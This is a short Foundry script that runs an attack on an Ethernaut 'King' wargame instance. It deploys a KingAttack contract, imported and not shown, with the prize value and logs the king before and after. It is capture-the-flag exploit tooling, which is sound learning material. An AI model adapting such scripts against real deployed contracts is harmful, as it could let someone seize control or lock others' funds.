// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "../src/KingAttack.sol"; // 1) add file

contract SolveKing is Script { // 2) change contractName

    function run() external {

        address target = 0xB42370B4732fBe50c838202A1097ddb7c197219a; // 3) add ethernaut instance address
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        IKing kingInstance = IKing(target);

        vm.startBroadcast(privateKey);

        console.log("Le king avant est: ", IKing(target)._king());

        new KingAttack{value: kingInstance.prize()}(kingInstance);
            
        console.log("Le king apres est: ", IKing(target)._king());

        vm.stopBroadcast();

    }
}